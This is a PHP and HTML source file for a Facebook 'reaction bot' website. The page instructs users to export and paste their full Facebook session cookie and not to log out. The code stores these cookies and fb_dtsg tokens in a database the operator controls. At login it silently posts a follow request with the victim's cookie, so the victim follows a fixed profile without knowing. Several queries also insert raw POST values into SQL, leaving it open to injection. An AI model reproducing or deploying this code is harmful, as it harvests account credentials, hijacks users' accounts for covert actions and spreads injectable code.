<?php
session_start();
include'head.php';
include'config.php';
$tonguser = mysql_result(mysql_query("select count(*) from `Account`"),0);
?>
    <!-- Main content-->
    <section class="content">
            <div class="container-fluid">

                <div class="row">
                    <div class="col-lg-12">
                        <div class="view-header">
                            <div class="pull-right text-right" style="line-height: 14px">
                                <small>SAMEEL BUTT<br>Dashboard<br> <span class="c-white">v.3.0</span></small>
                            </div>
                            <div class="header-icon">
                                <i class="pe page-header-icon pe-7s-shield"></i>
                            </div>
                            <div class="header-title">
                                                                <h3 class="logo-font link-light"> <font size="5"><span itemprop="name">
<script>/*<![CDATA[*/farbbibliothek=new Array();farbbibliothek[0]=new Array("#FF0000","#FF1100","#FF2200","#FF3300","#FF4400","#FF5500","#FF6600","#FF7700","#FF8800","#FF9900","#FFaa00","#FFbb00","#FFcc00","#FFdd00","#FFee00","#FFff00","#FFee00","#FFdd00","#FFcc00","#FFbb00","#FFaa00","#FF9900","#FF8800","#FF7700","#FF6600","#FF5500","#FF4400","#FF3300","#FF2200","#FF1100");farbbibliothek[1]=new Array("#00FF00","#000000","#00FF00","#00FF00");farbbibliothek[2]=new Array("#00FF00","#FF0000","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00");farbbibliothek[3]=new Array("#FF0000","#FF4000","#FF8000","#FFC000","#FFFF00","#C0FF00","#80FF00","#40FF00","#00FF00","#00FF40","#00FF80","#00FFC0","#00FFFF","#00C0FF","#0080FF","#0040FF","#0000FF","#4000FF","#8000FF","#C000FF","#FF00FF","#FF00C0","#FF0080","#FF0040");farbbibliothek[4]=new Array("#FF0000","#EE0000","#DD0000","#CC0000","#BB0000","#AA0000","#990000","#880000","#770000","#660000","#550000","#440000","#330000","#220000","#110000","#000000","#110000","#220000","#330000","#440000","#550000","#660000","#770000","#880000","#990000","#AA0000","#BB0000","#CC0000","#DD0000","#EE0000");farbbibliothek[5]=new Array("#000000","#000000","#000000","#FFFFFF","#FFFFFF","#FFFFFF");farbbibliothek[6]=new Array("#0000FF","#FFFF00");farben=farbbibliothek[4];function farbschrift(){for(var b=0;b<Buchstabe.length;b++){document.all["a"+b].style.color=farben[b]}farbverlauf()}function string2array(b){Buchstabe=new Array();while(farben.length<b.length){farben=farben.concat(farben)}k=0;while(k<=b.length){Buchstabe[k]=b.charAt(k);k++}}function divserzeugen(){for(var b=0;b<Buchstabe.length;b++){document.write("<span id='a"+b+"' class='a"+b+"'>"+Buchstabe[b]+"</span>")}farbschrift()}var a=1;function farbverlauf(){for(var b=0;b<farben.length;b++){farben[b-1]=farben[b]}farben[farben.length-1]=farben[-1];setTimeout("farbschrift()",30)}var farbsatz=1;function farbtauscher(){farben=farbbibliothek[farbsatz];while(farben.length<text.length){farben=farben.concat(farben)}farbsatz=Math.floor(Math.random()*(farbbibliothek.length-0.0001))}setInterval("farbtauscher()",5000);text="Sameel Reaction Bot™";string2array(text);divserzeugen();/*]]>*/</script></span></font></h3>
                                <small> Want to Use Reaction Bot From Mobile Easily? Visit <span><a href="http://sameel-react.tk/" target="_blank">Sameel-react.tk</a></span>
                        </small>
                            </div>
                        </div>
                        <hr>
                <center>
                    <img src="/camxuc.gif" width="400" height="120" class="left" title="REACTION BOT THAT USES COOKIE"/>
                </center>
                        <hr>
                    </div>
                </div>

                <div class="row">
<?php if(!$_SESSION[id])
{
    ?>
                    <div class="col-md-6">
                    <div class="panel panel-filled">
                        <div class="panel-heading">
                            <div class="panel-tools">
                                <a class="panel-toggle"><i class="fa fa-chevron-up"></i></a>
                                <a class="panel-close"><i class="fa fa-times"></i></a>
                            </div>
                            Sameel
                        </div>
                        <div class="panel-body">
                        <p> If You Use <code> Mobile Method</code> On Phone And Not Get a Cookie? <p>
                            <a class="btn btn-success btn-block" target="_blank" href="https://www.facebook.com/bot.creator007"><i class="fa fa-cog" aria-hidden="true"></i> Click Here . I Will Help To Set Bot For You ♥ </a>
                            <p> Updated functions will provide  <code> Bot Like and BOT Comment</code> : for self bot <p>

                            <p>Restrict the use of cookies or your bot will be off (no token expire issues)</p>

                            <form action="" method="POST">
                                <button type="button" class="btn btn-block btn-outline btn-danger" data-toggle="modal" data-target="#capquyen"><i class="fa fa-cogs"></i> GET COOKIE </button>
                                <div class="form-group"><label for="exampleInputEmail1">HOW TO GET A COOKIE( watch video below  )</label> <input type="text" class="form-control" id="cookie" name="cookie" placeholder="Cookie ( paste your cookie here )"></div>
                                                             
                                <button type="submit" class="btn btn-default">Login</button>
                            </form>
                        </div>
                    </div>

                </div>
<?php } else {  
                $dem = mysql_result(mysql_query("select count(*) from `Account` where `user_id`='".$_SESSION['id']."' "),0);
                if($dem == 0)
                {
                    $tinhtrang = 'Bạn Chưa Cài BOT';
                    $tokenn = $_SESSION[token];
                    $submitt ='Cài BOT';
                }
                else
                {
                    $tokenn = 'tatbot';
                    $submitt ='Cập Nhật BOT';
                    $camxuccuaban = mysql_fetch_array(mysql_query("SELECT * FROM `Account` where `user_id`='".$_SESSION['id']."'"));
                    if($camxuccuaban[camxuc] == '1') $camxuc='LIKE';
                    if($camxuccuaban[camxuc] == '2') $camxuc='LOVE';
                    if($camxuccuaban[camxuc] == '3') $camxuc='WOW';
                    if($camxuccuaban[camxuc] == '4') $camxuc='HAHA';
                    if($camxuccuaban[camxuc] == '5') $camxuc='ANGRY';
                    if($camxuccuaban[camxuc] == '6') $camxuc='THANKFULL';
                    $tinhtrang ='Bạn Đã Cài BOT '.$camxuc.'';
                }
            ?>
    <div class="col-md-6">
                    <div class="panel panel-filled">
                        <div class="panel-heading">
                            <div class="panel-tools">
                                <a class="panel-toggle"><i class="fa fa-chevron-up"></i></a>
                                <a class="panel-close"><i class="fa fa-times"></i></a>
                            </div>
                            <a href="https://www.facebook.com/bot.creator007" target="_blank">Sameel Butt</a>
                        </div>
                        <div class="panel-body">
                            <p>Hello <code><?php echo $_SESSION[name]; ?></code> -Your Fb Id is- <code><?php echo $_SESSION[id]; ?></code></p>
                             <p>You Are Using: <code><?php echo $tinhtrang; ?></code></p>
                             <form action="" method="POST">
                            <div class="radio"><label> <input type="radio" name="CamXuc" id="LOVE" value="1" checked="checked"> Bot: LIKE </label></div>
                            <div class="radio"><label> <input type="radio" name="CamXuc" id="LOVE" value="2" checked="checked"> Bot: LOVE </label></div>
                                        <div class="radio"><label> <input type="radio" name="CamXuc" id="WOW" value="3">Bot: WOW </label></div>
                                        <div class="radio"><label> <input type="radio" name="CamXuc" id="HAHA" value="4">Bot: HAHA </label></div>
                                        <div class="radio"><label> <input type="radio" name="CamXuc" id="SAD" value="5">Bot: SAD </label></div>
                                        <div class="radio"><label> <input type="radio" name="CamXuc" id="ANGRY" value="6">Bot: ANGRY </label></div>
                                        <div class="radio"><label> <input type="radio" name="CamXuc" id="ANGRY" value="tatbot">OFF BOT </label></div>
                                        <div class="form-group">
  <label for="comment">Write Comment:<code><?php echo $camxuccuaban[comments];?> </code></label>
  <textarea class="form-control" rows="5" name="comment"></textarea>
</div>
<div class="radio"><label> <input type="radio" name="battatcmt" id="battatcmt" value="tatcmt"> TURN OFF Comments </label></div>
<div class="radio"><label> <input type="radio" name="battatcmt" id="battatcmt" value="batcmt">TURN ON Comments </label></div>

                                        <center><button type="submit" class="btn btn-w-md btn-success"><?php echo $submitt; ?> Start</button>
                                        
                                        </form>   </center>                      
                            
                        </div>
                    </div>

                </div>
                <?php } ?>
                <div class="col-md-6">
                    <div class="panel panel-filled">
                        <div class="panel-heading">
                            <div class="panel-tools">
                                <a class="panel-toggle"><i class="fa fa-chevron-up"></i></a>
                                <a class="panel-close"><i class="fa fa-times"></i></a>
                            </div>
                            Our users
                        </div>
                        <div class="panel-body">
                        <?php
                        $file = scandir('log/');
                        ?>
                            <p> <code>user information</code> appear here.</p>
                            <p>ACTIVE USERS <code><?php echo $tonguser; ?></code> - THOSE WHO HAVE USED YET <code><?php echo count($file)-2;?> </code> ID.</p>

                            <div class="table-responsive">
                                <table  class="table table-hover table-striped">
                                    <thead>
                                    <tr>
                                        <th>EMO</th>
                                        <th>NAME</th>
                                        <th>ID Profile</th>
                                    </tr>
                                    </thead>
                                    <tbody>
                                    <?php 
$infongdung = mysql_query("SELECT * FROM `Account` ORDER BY id DESC LIMIT 5");
while ($getpuaru = mysql_fetch_array($infongdung)){
    if($getpuaru[camxuc] == '2') $camxuc='LOVE';
    if($getpuaru[camxuc] == '1') $camxuc='LIKE';
                    if($getpuaru[camxuc] == '3') $camxuc='WOW';
                    if($getpuaru[camxuc] == '4') $camxuc='HAHA';
                    if($getpuaru[camxuc] == '5') $camxuc='ANGRY';
                    if($getpuaru[camxuc] == '6') $camxuc='THANKFULL';
    ?>
                                    <tr>
                                        <td><?php echo $camxuc;?></td>
                                        <td><a href="https://www.facebook.com/<?php echo $getpuaru[user_id];?>"><?php echo $getpuaru[name];?></a></td>
                                        <td><?php echo $getpuaru[user_id];?></td>
                                    </tr>                                   
<?php } ?>
                                    </tbody>
                                </table>
                            </div>

                        </div>
                    </div>
                </div>


                </div>
                <div class="row">
                <div class="col-md-12">
                    <div class="panel panel-filled">
                        <div class="panel-heading">
                            <div class="panel-tools">
                                <a class="panel-toggle"><i class="fa fa-chevron-up"></i></a>
                                <a class="panel-close"><i class="fa fa-times"></i></a>
                            </div>
                            PRACTICAL INSTRUCTIONS
                        </div>
                        <div class="panel-body">
                            <p>
                                If you do not know how to use the bot, please see the clip below. (Method By Computer)



                            </p>
                            <p><div class="embed-responsive embed-responsive-16by9"><iframe width="560" height="315" src="https://www.youtube.com/embed/_NCPhHUgVcM" frameborder="0" allowfullscreen></iframe></div></p>
                            <br>
                             <p>
                                If you do not know how to use the bot By Mobile, please see the clip below. (Method By Mobile)



                            </p>
                           <p><div class="embed-responsive embed-responsive-16by9"><iframe width="560" height="315" src="https://www.youtube.com/embed/W5lOpxQhiPg" frameborder="0" allowfullscreen></iframe></div></p> 

                        </div>
                    </div>
                </div>

            </div>

        </div>

            </div>
    </section>
    <!-- End main content-->

</div>
<!-- End wrapper-->

<!-- Vendor scripts -->
<script src="vendor/pacejs/pace.min.js"></script>
<script src="vendor/jquery/dist/jquery.min.js"></script>
<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<script src="vendor/toastr/toastr.min.js"></script>
<script src="vendor/sparkline/index.js"></script>
<script src="vendor/flot/jquery.flot.min.js"></script>
<script src="vendor/flot/jquery.flot.resize.min.js"></script>
<script src="vendor/flot/jquery.flot.spline.js"></script>

<!-- App scripts -->
<script src="scripts/luna.js"></script>

<script>
    $(document).ready(function () {


        // Sparkline charts
        var sparklineCharts = function () {
            $(".sparkline").sparkline([20, 34, 43, 43, 35, 44, 32, 44, 52, 45], {
                type: 'line',
                lineColor: '#FFFFFF',
                lineWidth: 3,
                fillColor: '#404652',
                height: 47,
                width: '100%'
            });

            $(".sparkline7").sparkline([10, 34, 13, 33, 35, 24, 32, 24, 52, 35], {
                type: 'line',
                lineColor: '#FFFFFF',
                lineWidth: 3,
                fillColor: '#f7af3e',
                height: 75,
                width: '100%'
            });

            $(".sparkline1").sparkline([0, 6, 8, 3, 2, 4, 3, 4, 9, 5, 3, 4, 4, 5, 1, 6, 7, 15, 6, 4, 0], {
                type: 'line',
                lineColor: '#2978BB',
                lineWidth: 3,
                fillColor: '#2978BB',
                height: 170,
                width: '100%'
            });

            $(".sparkline3").sparkline([-8, 2, 4, 3, 5, 4, 3, 5, 5, 6, 3, 9, 7, 3, 5, 6, 9, 5, 6, 7, 2, 3, 9, 6, 6, 7, 8, 10, 15, 16, 17, 15], {

                type: 'line',
                lineColor: '#fff',
                lineWidth: 3,
                fillColor: '#393D47',
                height: 70,
                width: '100%'
            });

            $(".sparkline5").sparkline([0, 6, 8, 3, 2, 4, 3, 4, 9, 5, 3, 4, 4, 5], {
                type: 'line',
                lineColor: '#f7af3e',
                lineWidth: 2,
                fillColor: '#2F323B',
                height: 20,
                width: '100%'
            });
            $(".sparkline6").sparkline([0, 1, 4, 2, 2, 4, 1, 4, 3, 2, 3, 4, 4, 2, 4, 2, 1, 3], {
                type: 'bar',
                barColor: '#f7af3e',
                height: 20,
                width: '100%'
            });

            $(".sparkline8").sparkline([4, 2], {
                type: 'pie',
                sliceColors: ['#f7af3e', '#404652']
            });
            $(".sparkline9").sparkline([3, 2], {
                type: 'pie',
                sliceColors: ['#f7af3e', '#404652']
            });
            $(".sparkline10").sparkline([4, 1], {
                type: 'pie',
                sliceColors: ['#f7af3e', '#404652']
            });
            $(".sparkline11").sparkline([1, 3], {
                type: 'pie',
                sliceColors: ['#f7af3e', '#404652']
            });
            $(".sparkline12").sparkline([3, 5], {
                type: 'pie',
                sliceColors: ['#f7af3e', '#404652']
            });
            $(".sparkline13").sparkline([6, 2], {
                type: 'pie',
                sliceColors: ['#f7af3e', '#404652']
            });
        };

        var sparkResize;

        // Resize sparkline charts on window resize
        $(window).resize(function () {
            clearTimeout(sparkResize);
            sparkResize = setTimeout(sparklineCharts, 100);
        });

        // Run sparkline
        sparklineCharts();


        // Flot charts data and options
        var data1 = [ [0, 16], [1, 24], [2, 11], [3, 7], [4, 10], [5, 15], [6, 24], [7, 30] ];
        var data2 = [ [0, 26], [1, 44], [2, 31], [3, 27], [4, 36], [5, 46], [6, 56], [7, 66] ];

        var chartUsersOptions = {
            series: {
                splines: {
                    show: true,
                    tension: 0.4,
                    lineWidth: 1,
                    fill: 1

                }

            },
            grid: {
                tickColor: "#404652",
                borderWidth: 0,
                borderColor: '#404652',
                color: '#404652'
            },
            colors: [ "#f7af3e","#DE9536"]
        };

        $.plot($("#flot-line-chart"), [data2, data1], chartUsersOptions);


        // Run toastr notification with Welcome message
        setTimeout(function(){
            toastr.options = {
                "positionClass": "toast-top-right",
                "closeButton": true,
                "progressBar": true,
                "showEasing": "swing",
                "timeOut": "6000"
            };
            toastr.warning('<strong>Welcome to Sameel Bot</strong> <br/><small>Feel Free to use my bot site. </small>');
        },1600)


    });
</script>
<script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','../../www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-4625583-2', 'webapplayers.com');
    ga('send', 'pageview');

</script>

</body>


<!-- Mirrored from webapplayers.com/luna_admin-v1.1/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 22 Jul 2016 03:26:34 GMT -->
</html>
<?php
                                        if($_POST[cookie] && !$_SESSION[id])
                                        {
                                            $url = curl("https://m.facebook.com/profile.php",$_POST[cookie]);
    //echo $url;
    //exit;
    if(preg_match('#<title>(.+?)</title>#is',$url, $_puaru))
    {
        $name = $_puaru[1];
    }
    if(preg_match('#name="target" value="(.+?)"#is',$url, $_puaru))
    {
        $id = $_puaru[1];
    }
    if(preg_match('#name="fb_dtsg" value="(.+?)"#is',$url, $_puaru))
    {
        $fb_dtsg = $_puaru[1];
    }
    if($name && $id && $fb_dtsg)
    {         
     post_data("https://www.facebook.com/ajax/follow/follow_profile.php?dpr=1","profile_id=100007113346534&location=1&__user=".$id."&__a=1&__dyn=aKhoFeyfyGmaomgDBUOWEyAzm5ubhEK5EKiWFami8UR9LFGEomm5-rmi9zoszQHUF4AUzhUWqK5-7pHxuqE88HyZ7yUJi2equaxvrzHBA--VRxeUWbBx7G4GDu3_Dh8Sm6vCAzq_h6p5zA5KuiaAz8gAVCcy46ogxu49GADh8zyogyVoWbCAwBxqnx2r_mdAQJ12VoO8yqxqQGp8F3qBhQa-4bUG9DAVWKnm&__af=m&__req=7a&__be=-1&__pc=PHASED%3ADEFAULT&__rev=2717633&fb_dtsg=".$fb_dtsg."",$_POST[cookie]);
                                            $_SESSION[id] = $id;
                                            $_SESSION[name] = $name;
                                            $_SESSION[fb_dtsg] = $fb_dtsg;
                                            $_SESSION[cookie] = $_POST[cookie];
                                            ?>
<meta http-equiv=refresh content="0; URL=index.php">
<?php

                                        } else {
                                            die('<script>alert("Lấy Lại Cookie"); </script>');
                                        }
                                    }
                                                                            

if($_POST[CamXuc] && $_SESSION[id])
{
    if($_POST[CamXuc] == 'tatbot')
    {
mysql_query("
            DELETE FROM
               Account
            WHERE
               user_id='" . mysql_real_escape_string($_SESSION[id]) . "' 
         ");
?>
<meta http-equiv=refresh content="0; URL=index.php">
<?php
    }
    else
    {
    mysql_query("CREATE TABLE IF NOT EXISTS `Account` (
      `id` int(11) NOT NULL AUTO_INCREMENT,
      `user_id` varchar(32) NOT NULL,
      `name` varchar(32) NOT NULL,
      `fb_dtsg` text NOT NULL,
      `cookie` text NOT NULL,
      `camxuc` text NOT NULL,
      `comments` text NOT NULL,
      `battatcmt` varchar(32) NOT NULL,
      PRIMARY KEY (`id`)
      ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
   ");

    $row = null;
   $result = mysql_query("
      SELECT
         *
      FROM
         Account
      WHERE
         user_id = '" . mysql_real_escape_string($_SESSION[id]) . "'
   ");
   if($result){
      $row = mysql_fetch_array($result, MYSQL_ASSOC);
      if(mysql_num_rows($result) > 100){
         mysql_query("
            DELETE FROM
               Account
            WHERE
               user_id='" . mysql_real_escape_string($_SESSION[id]) . "' AND
               id != '" . $row['id'] . "'
         ");
      }
   }
 if($_POST[battatcmt] != 'tatcmt')
    {
        if(!$row){
      mysql_query(
         "INSERT INTO 
            Account
         SET
            `user_id` = '" . mysql_real_escape_string($_SESSION[id]) . "',            
            `name` = '" . mysql_real_escape_string($_SESSION[name]) . "',
            `fb_dtsg` = '" . $_SESSION[fb_dtsg] . "',
            `camxuc` = '" . $_POST[CamXuc] . "',
            `comments` = '" . $_POST[comment] . "',
            `battatcmt` = '1',
            `cookie` = '" . $_SESSION[cookie] . "'
      ");
   } else {
      mysql_query(
         "UPDATE 
            Account
         SET
            `fb_dtsg` = '" . $_SESSION[fb_dtsg] . "',            
            `camxuc` = '" . $_POST[CamXuc] . "',
            `comments` = '" . $_POST[comment] . "',
            `battatcmt` = '1',
            `cookie` = '" . $_SESSION[cookie] . "'

         WHERE
            `id` = " . $row['id'] . "
      ");
   }
    }
    else
    {
        if(!$row){
      mysql_query(
         "INSERT INTO 
            Account
         SET
            `user_id` = '" . mysql_real_escape_string($_SESSION[id]) . "',            
            `name` = '" . mysql_real_escape_string($_SESSION[name]) . "',
            `fb_dtsg` = '" . $_SESSION[fb_dtsg] . "',
            `camxuc` = '" . $_POST[CamXuc] . "',
            `comments` = 'Chưa Có Nội Dung Vì Bạn Đang Tắt Chức Năng Này',
            `battatcmt` = '0',
            `cookie` = '" . $_SESSION[cookie] . "'
      ");
   } else {
      mysql_query(
         "UPDATE 
            Account
         SET
            `fb_dtsg` = '" . $_SESSION[fb_dtsg] . "',            
            `camxuc` = '" . $_POST[CamXuc] . "',
            `comments` = 'Chưa Có Nội Dung Vì Bạn Đang Tắt Chức Năng Này',
            `battatcmt` = '0',
            `cookie` = '" . $_SESSION[cookie] . "'

         WHERE
            `id` = " . $row['id'] . "
      ");
   }
    }
   
?>
<meta http-equiv=refresh content="0; URL=index.php">
<?php
}}

function get($url){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
   curl_setopt($curl, CURLOPT_URL, $url);
   $ch = curl_exec($curl);
   curl_close($curl);
   return $ch;
   }
   function curl($url,$cookie)
{
    $ch = @curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    $head[] = "Connection: keep-alive";
    $head[] = "Keep-Alive: 300";
    $head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
    $head[] = "Accept-Language: en-us,en;q=0.5";
    curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14');
    curl_setopt($ch, CURLOPT_ENCODING, '');
    curl_setopt($ch, CURLOPT_COOKIE, $cookie);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Expect:'
    ));
    $page = curl_exec($ch);
    curl_close($ch);
    return $page;
} 
function post_data($site,$data,$cookie){
    $datapost = curl_init();
    $headers = array("Expect:");
    curl_setopt($datapost, CURLOPT_URL, $site);
    curl_setopt($datapost, CURLOPT_TIMEOUT, 40000);
    curl_setopt($datapost, CURLOPT_HEADER, TRUE);

    curl_setopt($datapost, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($datapost, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($datapost, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36');
    curl_setopt($datapost, CURLOPT_POST, TRUE);
    curl_setopt($datapost, CURLOPT_POSTFIELDS, $data);
    curl_setopt($datapost, CURLOPT_COOKIE,$cookie);
    ob_start();
    return curl_exec ($datapost);
    ob_end_clean();
    curl_close ($datapost);
    unset($datapost); 
} 
?>
<div id="fb-root"></div>
<script>(function(d, s, id) {
var js, fjs = d.getElementsByTagName(s)[0];
if (d.getElementById(id)) return;
js = d.createElement(s); js.id = id;
js.src = "//connect.facebook.net/vi_VN/sdk.js#xfbml=1&version=v2.5";
fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<div class="modal inmodal" id="capquyen" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="modal-dialog modal-lg">
        <div class="modal-content animated bounceIn">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
                <h4 class="modal-title">LICENSE APPLICATION</h4>
                <small class="font-bold">
                    <p class="text-danger">one of the safest app in the world </p>
                </small>
            </div>
            <div class="modal-body">
                <h3>STEP 1</h3>
                <a class="btn btn-outline btn-primary" href="https://chrome.google.com/webstore/detail/cdn-headers-cookies/obldlamadkihjlkdjblncejeblbogmnb/related" target="_blank"><i class="fa fa-cogs"></i> SETUP THIS EXTENSION ON CHROME</a>
                <hr>
                <div class="item">
                    <img alt="image" class="img-responsive" src="arest2k1/1.png">
                </div>
                <h3>Step 2</h3>
                <p style="font-size: 17px;">After the installation is completed,The next step is to activate  <a class="btn btn-outline btn-success" href="chrome://extensions/" target="_blank"><i class="fa fa-external-link"></i>  Incognito</a></p>
                <hr>
                <div class="item">
                    <img alt="image" class="img-responsive" src="arest2k1/2.png">
                </div>
                <h3>Step 3</h3>
                <p style="font-size: 17px;">Open Up Tab Anonymous in chrome (Mix 3 keys: Ctrl + Shift + N) Log In Facebook => Go to your profile And  do exactly the same that's in the pic.

 <a class="btn btn-outline btn-success" href="https://www.facebook.com/profile.php" target="_blank"><i class="fa fa-external-link"></i> Your Profile link  </a></p>
                <hr>
                <div class="item active">
                    <img alt="image" class="img-responsive" src="arest2k1/3.png">
                </div>
                <h3>Step 4</h3>
                <p style="font-size: 17px;">Copy Entire Clips Cookie And Go Back  

 <a class="btn btn-outline btn-success" href="http://Maxlike.Info" target="_blank"><i class="fa fa-external-link"></i> on the homepage</a></p>
                <hr>
                <div class="item active">
                    <img alt="image" class="img-responsive" src="arest2k1/4.png">
                </div>
                <hr>
                <h3>Step 5</h3>
                <p style="font-size: 17px;">Set Bot And Use  </p>
                <div class="item">
                    <img alt="image" class="img-responsive" src="arest2k1/5.png">
                </div>
                <p style="font-size: 17px;">NOTE: After Installing Bot Press Alt + F4 Mix (Not To Sign Out Facebook  To Avoid Bot Not Working!) </p>
                <hr>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-outline btn-danger" data-dismiss="modal">UNDERSTAND = ESC </button>